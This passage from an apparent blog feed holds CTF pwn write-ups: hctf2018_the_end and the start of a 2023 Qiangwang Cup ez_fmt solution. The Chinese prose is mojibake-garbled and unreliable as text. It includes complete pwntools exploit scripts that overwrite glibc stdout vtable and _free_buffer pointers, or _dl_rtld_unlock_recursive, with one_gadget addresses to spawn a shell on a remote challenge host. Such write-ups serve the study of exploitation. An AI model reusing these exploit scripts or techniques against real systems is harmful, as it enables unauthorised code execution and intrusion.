_IO_OVERFLOWï¼ˆ_IO_finish_tï¼‰</p><p>å…ˆç”¨ä¸¤æ¬¡ä¿®æ”¹æ¬¡æ•°ï¼Œæ¥å°†stdout.vtableæŒ‡å‘&amp;_IO_str_jumps-8ï¼Œè¿™æ ·exitåœ¨è°ƒç”¨_IO_flush_all_lockpæ—¶ä¼šæ‰§è¡Œ_IO_str_finishï¼Œè€Œä¸æ˜¯_IO_overflow</p><p>ä¿®æ”¹((_IO_strfile *) fp)-&gt;_s._free_buffer ä¸º one_gadget åœ°å€ï¼Œ è§¦å‘ç¨‹åºæ‰§è¡Œ _IO_str_finishå‡½æ•°å°±å¯ä»¥å¾—åˆ° shellï¼Œä½†æ˜¯ç”±äºå­˜åœ¨ç»•è¿‡çš„è¦æ±‚ï¼Œä¸å¤Ÿå†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡ï¼š</p><blockquote><p>è¦æ»¡è¶³ fp-&gt;_IO_buf_base ä¸ä¸ºç©ºï¼Œå¹¶ä¸”ç”±äºå®ƒä½œä¸º fp-&gt;_s._free_buffer çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ &#x2F;bin&#x2F;sh çš„åœ°å€ã€‚<br>fp-&gt;_flags è¦ä¸åŒ…å«_IO_USER_BUFï¼Œå®ƒçš„å®šä¹‰ä¸º #define _IO_USER_BUF 1ï¼Œå³ fp-&gt;_flags æœ€ä½ä½ä¸º 0 ã€‚<br>ç¼“å†²åŒºéœ€è¦æœ‰æ•°æ®ï¼Œå³ _IO_write_base &lt; _IO_write_ptr ã€‚<br>_mode éœ€è¦å°äºç­‰äº 0 ã€‚</p><p>_flags &amp;&#x3D; -1</p><p>_IO_write_base &lt; _IO_write_ptr</p><p>*vtable &#x3D; &amp;_IO_str_jumps - 0x8  </p><p>_free_buffer &#x3D; one_gadget</p></blockquote><p>_IO_write_ptr éœ€è¦å†™ä¸€æ¬¡ï¼Œ*vtable &#x3D; &amp;_IO_str_jumps - 0x8  éœ€è¦å†™ä¸¤æ¬¡ï¼Œ_free_buffer &#x3D; one_gadgetéœ€è¦æ”¹ä¸‰æ¬¡ï¼Œè¡Œä¸é€š</p><p>å¦‚æœèƒ½æœ‰å…­æ¬¡å†™çš„æœºä¼šçš„è¯ï¼Œå°±èƒ½æ‰“_IO_flush_all_lockp</p><p>æ”¹å¦ä¸€æ¡é“¾å­ __run_exit_handlers  â€“&gt; __fcloseall  â€“&gt;  _IO_cleanup â€“&gt; _IO_unbuffer_all â€“&gt; _IO_setbufï¼Œä¸‹é¢è¿™ä¸ªåšå®¢æ‰€ç¤ºæ–¹æ³•</p><p><a href="https://www.jianshu.com/p/ad0b895e5a86">2018 HCTF the_end - ç®€ä¹¦ (jianshu.com)</a></p><p>ç”±äºåŸé¢˜æ˜¯2.23çš„ï¼Œæ‰€ä»¥èƒ½ä»»æ„ä¼ªé€ vtableåœ°å€åˆ°ä»»æ„åœ°å€</p><ul><li><p>åˆ©ç”¨çš„æ˜¯åœ¨ç¨‹åºè°ƒç”¨ <code>exit</code> åï¼Œä¼šéå†<code>_IO_list_all</code>,è°ƒç”¨<code>_IO_2_1_stdout_</code>ä¸‹çš„<code>vatable</code>ä¸­<code>_setbuf</code>å‡½æ•°.</p></li><li><p>å¯ä»¥å…ˆä¿®æ”¹ä¸¤ä¸ªå­—èŠ‚åœ¨å½“å‰<code>vtable</code>é™„è¿‘ä¼ªé€ ä¸€ä¸ª<code>fake_vtable</code>ï¼Œç„¶åä½¿ç”¨ 3 ä¸ªå­—èŠ‚ä¿®æ”¹<code>fake_vtable</code>ä¸­<code>_setbuf</code>çš„å†…å®¹ä¸º<code>one_gadget</code>.</p></li></ul><p>æœ¬åœ°patch 2.23</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102038387.png" alt="image-20240610203831160"></p><p>å°†vtableè¿ç§»åˆ°å¯å†™æ®µä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ _IO_OVERFLOW\_IO_SETBUFä¸ºone_gadgetï¼Œæœ€åæ‰§è¡Œé“¾å­1\2è·å–shell</p><p>è®¾ç½®ç›®æ ‡ä½œä¸º_IO_OVERFLOW\_IO_SETBUFï¼Œé€šè¿‡åç§»å‡½æ•°åœ¨è™šè¡¨ä¸­çš„åç§»æ¥è®¡ç®—å¾—åˆ°fake_vtable_addr</p><p>æ‰“_IO_SETBUFï¼ŒæˆåŠŸæ‰§è¡Œåˆ°one_gadgetäº†ï¼Œä½†æ˜¯æ ˆçš„é—®é¢˜æ²¡æœ‰æ‰§è¡Œï¼Œè¯•äº†å‡ ä¸ªéƒ½æ²¡ç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102110358.png" alt="image-20240610211016997"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># one_gadget = [0x4f2c5, 0x4f322, 0x10a38c, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a398]</span></span><br><span class="line">    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>, <span class="number">0xcd173</span>, <span class="number">0xcd248</span>, <span class="number">0xf03a4</span>, <span class="number">0xf03b0</span>, <span class="number">0xf1247</span>, <span class="number">0xf67f0</span>]</span><br><span class="line">    one = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">    ori0 = one &amp; <span class="number">0xff</span></span><br><span class="line">    ori1 = one&gt;&gt;<span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori2 = one&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori3 = one&gt;&gt;<span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori4 = one&gt;&gt;<span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">    leak(<span class="string">&quot;one_gadget&quot;</span>, one)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))</span><br><span class="line"></span><br><span class="line">    stdout_vtable = libc_base + <span class="number">0x3c56f8</span>    <span class="comment">#--&gt;fake_vtable</span></span><br><span class="line">    fake_vtable_addr = libc_base + <span class="number">0x3c5588</span>  <span class="comment">#fake_vtable-&gt;0x58 =  _IO_setbuf_t</span></span><br><span class="line">    setbuf = libc_base + <span class="number">0x3c55e0</span>         </span><br><span class="line">    </span><br><span class="line">    leak(<span class="string">&quot;stdout_vtable&quot;</span>, stdout_vtable)</span><br><span class="line">    leak(<span class="string">&quot;fake_vtable&quot;</span>, fake_vtable_addr)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    debug(<span class="string">&quot;b _IO_flush_all_lockp&quot;</span>)</span><br><span class="line">    s(p64(stdout_vtable))</span><br><span class="line">    s(p8(fake_vtable_addr&amp;<span class="number">0xff</span>))</span><br><span class="line">    s(p64(stdout_vtable+<span class="number">1</span>))</span><br><span class="line">    s(p8(fake_vtable_addr&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    s(p64(setbuf))</span><br><span class="line">    s(p8(ori0))</span><br><span class="line">    s(p64(setbuf+<span class="number">1</span>))</span><br><span class="line">    s(p8(ori1))</span><br><span class="line">    s(p64(setbuf+<span class="number">2</span>))</span><br><span class="line">    s(p8(ori2))</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰“_IO_OVERFLOWçš„è¯éœ€è¦ç¼“å†²åŒºæœ‰æ•°æ®ï¼Œè¿™é‡Œéœ€è¦å¤šåˆ©ç”¨ä¸€å­—èŠ‚ä¿®æ”¹ï¼Œæ‰€ä»¥ä¸å¯è¡Œã€‚</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>è¿™é“é¢˜å¦‚æœæ²¡å¼€pieå’ŒRELROå¯ä»¥ç”¨fini_arrayæ¥æ‰“</p><p>å¦‚æœèƒ½å¤šå†™ä¸€å­—èŠ‚å¯ä»¥åˆ©ç”¨_IO_OVERFLOWï¼Œio_str_finish</p><p>è¿™é“é¢˜æ¶‰åŠäº†exit()å‡½æ•°çš„è°ƒç”¨é“¾ã€è¾ƒé«˜ç‰ˆæœ¬çš„IOåˆ©ç”¨ï¼Œæ˜¯ä¸€é“å€¼å¾—æ€è€ƒçš„é¢˜ç›®</p><hr><h2 id="ç»­ï¼šio-str-finish"><a href="#ç»­ï¼šio-str-finish" class="headerlink" title="ç»­ï¼šio_str_finish"></a>ç»­ï¼šio_str_finish</h2><p>è¯•è¯•io_str_finishæ‰“ï¼Œç»™æ–‡ä»¶æ‰“è¡¥ä¸ï¼Œéœ€è¦å¤šå†™ä¸€å­—èŠ‚æ¥ä¿®æ”¹_IO_write_ptræŒ‡é’ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111243066.png" alt="image-20240611124316929"></p><p>å°†0x837df404ä¿®æ”¹æˆ0x837df405</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111246252.png" alt="image-20240611124604166"></p><p>2.27_3.1 patch</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111249308.png" alt="image-20240611124949226"></p><p>å¯æƒœone_gadgetå¾—åˆ°çš„gadgetéƒ½ç”¨ä¸äº†ï¼Œè¯•ç€åœ¨libcé‡Œé¢æ‰¾ä¹Ÿæ²¡æ‰¾åˆ°åˆé€‚çš„gadget</p><blockquote><p>_IO_2_1_stdout_{</p><p>â€‹     _flag &amp;&#x3D; -1</p><p>â€‹     IO_write_base &lt; IO_write_ptr</p><p>â€‹    _IO_buf_base &#x3D; &amp;_bin_sh</p><p>â€‹    _modle &lt;&#x3D; 0</p><p>â€‹    *vtable &#x3D; &amp;_IO_str_jumps - 0x8   &#x3D;&#x3D;&gt;  __IO_overflow -&gt; _IO_finish_t</p><p>â€‹     }</p><p>stdout_str_fields &#x3D; system(one_gadget)</p></blockquote><p>è°ƒç”¨é“¾ï¼š __run_exit_handlers  â€“&gt; __fcloseall  â€“&gt;  _IO_cleanup â€“&gt; _IO_flush_all_lockp â€“&gt; _IO_OVERFLOWï¼ˆ_IO_finish_tï¼‰</p><p>å¦‚æœè¿˜æœ‰ä¸ªä»»æ„åœ°å€å†™å¤šå­—èŠ‚çš„è¯å¾€_IO_buf_base &#x3D; &amp;_bin_sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn1</span>():</span><br><span class="line">    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base</span><br><span class="line">    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base</span><br><span class="line">    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">    s(p64(dl_rtld_unlock_recursive))</span><br><span class="line">    s(p8(ori0))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))</span><br><span class="line">    s(p8(ori1))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))</span><br><span class="line">    s(p8(ori2))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))</span><br><span class="line">    s(p8(ori3))</span><br><span class="line">    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))</span><br><span class="line">    s(p8(ori4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./the_end_5&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]</span><br><span class="line">    one = libc_base + one_gadget[<span class="number">7</span>]</span><br><span class="line">    ori0 = one &amp; <span class="number">0xff</span></span><br><span class="line">    ori1 = one&gt;&gt;<span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori2 = one&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori3 = one&gt;&gt;<span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">    ori4 = one&gt;&gt;<span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">    leak(<span class="string">&quot;one_gadget&quot;</span>, one)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))</span><br><span class="line"></span><br><span class="line">    stdout_vtable = libc_base + <span class="number">0x3ec838</span>    <span class="comment">#--&gt;fake_vtable</span></span><br><span class="line">    stdout_free_buffer = libc_base + <span class="number">0x3ec848</span>  <span class="comment">#--&gt;one_gadget</span></span><br><span class="line">    fake_vtable = libc_base + <span class="number">0x3e8360</span> - <span class="number">8</span>    <span class="comment">#&amp;_IO_str_jumps - 8 </span></span><br><span class="line">    stdout_IO_write_ptr = libc_base + <span class="number">0x3ec788</span></span><br><span class="line">    </span><br><span class="line">    leak(<span class="string">&quot;stdout_vtable&quot;</span>, stdout_vtable)</span><br><span class="line">    leak(<span class="string">&quot;fake_vtable&quot;</span>, fake_vtable)</span><br><span class="line">    leak(<span class="string">&quot;stdout_free_buffer&quot;</span>, stdout_free_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># debug(&quot;b _IO_flush_all_lockp&quot;)</span></span><br><span class="line">    debug(<span class="string">&quot;b _IO_str_finish&quot;</span>)</span><br><span class="line">    s(p64(stdout_vtable))   <span class="comment">#æ”¹stdout_vtable -&gt; _IO_str_jumps-8, è°ƒç”¨_IO_OVERFLOWæ—¶ä¼šæŒ‰ç…§0x18åç§»æ‰¾åˆ°_IO_str_finish</span></span><br><span class="line">    s(p8(fake_vtable&amp;<span class="number">0xff</span>))</span><br><span class="line">    s(p64(stdout_vtable+<span class="number">1</span>))</span><br><span class="line">    s(p8(fake_vtable&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>))</span><br><span class="line">    </span><br><span class="line">    s(p64(stdout_free_buffer))</span><br><span class="line">    s(p8(ori0))</span><br><span class="line">    s(p64(stdout_free_buffer+<span class="number">1</span>))</span><br><span class="line">    s(p8(ori1))</span><br><span class="line">    s(p64(stdout_free_buffer+<span class="number">2</span>))</span><br><span class="line">    s(p8(ori2))</span><br><span class="line"></span><br><span class="line">    s(p64(stdout_IO_write_ptr))</span><br><span class="line">    s(p8(<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111301650.png" alt="image-20240611130110444"></p><blockquote><p>libc-2.28 ç‰ˆæœ¬èµ· _IO_str_finish ä¸å†è°ƒç”¨ _free_buffer è€Œæ˜¯ç›´æ¥æ˜¯ç›´æ¥è°ƒç”¨ free ï¼Œå› æ­¤è¯¥æ–¹æ³•å¤±æ•ˆã€‚</p><p>2.34ä»¥ä¸‹å¯ä»¥åˆ©ç”¨  IO_validate_vtable åŠ«æŒç¨‹åºæµï¼Œè‡ª glibc-2.24 èµ·åœ¨è°ƒç”¨ vtable ä¸­çš„å‡½æ•°å‰ä¼šè°ƒç”¨ IO_validate_vtable æ£€æŸ¥ vtable æ‰§å‘çš„ _IO_jump_t çš„åœ°å€æ˜¯å¦åˆæ³•ï¼Œå¦‚æœå¦‚æœ rtld_active è¿”å› trueï¼ˆå…·ä½“çœ‹è°ƒè¯•ï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨GLRO(dl_init_all_dirs)ä¸å¯å†™ä¸”ä¸º NULL çš„æƒ…å†µï¼‰åˆ™ä¼šè°ƒç”¨ _dl_addrï¼Œæœ€ç»ˆæ‰§è¡Œ __rtld_lock_lock_recursive (GL(dl_load_lock))   2.34å¤±æ•ˆ</p></blockquote><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/qq_45323960/article/details/123810198?app_version=6.3.7&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22123810198%22,%22source%22:%22qq_74106326%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">linux IO_FILE åˆ©ç”¨_io list allç»“æ„ä½“-CSDNåšå®¢</a></p><p><a href="https://www.anquanke.com/post/id/243196">exit()åˆ†æä¸åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hctf2018-the-end&quot;&gt;&lt;a href=&quot;#hctf2018-the-end&quot; class=&quot;headerlink&quot; title=&quot;hctf2018_the_end&quot;&gt;&lt;/a&gt;hctf2018_the_end&lt;/h1&gt;&lt;p&gt;è¿œç¨‹ï¼š2.27-3ubunt</summary>
      
    
    
    
    <category term="STU" scheme="http://tw11ty.github.io/categories/STU/"/>
    
    
    <category term="exit &amp; IO" scheme="http://tw11ty.github.io/tags/exit-IO/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨</title>
    <link href="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
    <id>http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-08T08:43:06.000Z</published>
    <updated>2024-11-16T08:37:23.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²</h1><h2 id="ã€2023-å¼ºç½‘æ¯ã€‘ez-fmt"><a href="#ã€2023-å¼ºç½‘æ¯ã€‘ez-fmt" class="headerlink" title="ã€2023 å¼ºç½‘æ¯ã€‘ez_fmt"></a>ã€2023 å¼ºç½‘æ¯ã€‘ez_fmt</h2><p>æ²¡å¼€pieï¼Œå¼€äº† full Relroï¼Œæ”¹ä¸äº†gotå’Œfini_arrayï¼Œä¹Ÿç»™äº†bufåœ°å€ï¼Œæ ˆä¸Šåœ°å€ç”¨åç§»ç®—</p><p>æ”¹printf_retåœ°å€ï¼Œç»•è¿‡w&#x3D;&#x3D;0xffffçš„é™åˆ¶ï¼Œæ§åˆ¶ç¨‹åºå†æ¬¡æ‰§è¡Œread 0x00401205  å†æ¬¡æ‰§è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span 